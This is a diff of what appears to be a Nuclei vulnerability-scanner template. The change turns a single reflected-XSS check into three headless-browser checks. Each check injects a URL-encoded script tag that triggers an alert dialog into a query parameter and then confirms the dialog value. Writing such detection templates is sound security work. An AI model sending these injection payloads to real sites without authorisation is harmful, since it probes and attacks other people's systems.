@@ -1,31 +1,45 @@
-id: headless-reflected-xss
-
-info:
-  name: Reflected Headless XSS
-  author: yar0v1t
-  severity: high
-  description: |
-    Reflected XSS vulnerability with headless mode.
-
 headless:
-  - steps:
-      - action: navigate
-        args:
-          url: "{{BaseURL}}/listproducts.php?cat=1<%2Fscript><script>alert%283%2B4%29<%2Fscript>"
+- matchers:
+  - condition: and
+    dsl:
+    - reflected_cat_query == true
+    - reflected_cat_query_message == "7"
+    type: dsl
+  steps:
+  - action: navigate
+    args:
+      url: '{{BaseURL}}/listproducts.php?cat=1%3C%2Fscript%3E%3Cscript%3Ealert%283%2B4%29%3C%2Fscript%3E'
+  - action: waitdialog
+    name: reflected_cat_query
+- matchers:
+  - condition: and
+    dsl:
+    - reflected_pp_query == true
+    - reflected_pp_query_message == "2"
+    type: dsl
+  steps:
+  - action: navigate
+    args:
+      url: '{{BaseURL}}/hpp/params.php?p=valid&pp=1%3Cscript%3Ealert%281%2B1%29%3C%2Fscript%3E'
+  - action: waitdialog
+    name: reflected_pp_query
+- matchers:
+  - condition: and
+    dsl:
+    - reflected_topicId_query == true
+    - reflected_topicId_query_message == "8"
+    type: dsl
+  steps:
+  - action: navigate
+    args:
+      url: '{{BaseURL}}/widgets/knowledgebase?topicId=%3Cscript%3Ealert%284%2B4%29%3C%2Fscript%3E'
+  - action: waitdialog
+    name: reflected_topicId_query
+id: headless-reflected-xss
+info:
+  author: yar0v1t
+  description: 'A cross-site scripting (XSS) vulnerability with headless mode.
 
-      - action: waitdialog
-        name: reflected_text_query
-        args:
-          max-duration: 10s
-
-    matchers-condition: and
-    matchers:
-      - type: dsl
-        dsl:
-          - reflected_text_query == true
-
-    extractors:
-      - type: dsl
-        dsl:
-          - reflected_text_query_type
-          - reflected_text_query_message
+    '
+  name: Reflected Headless XSS
+  severity: high
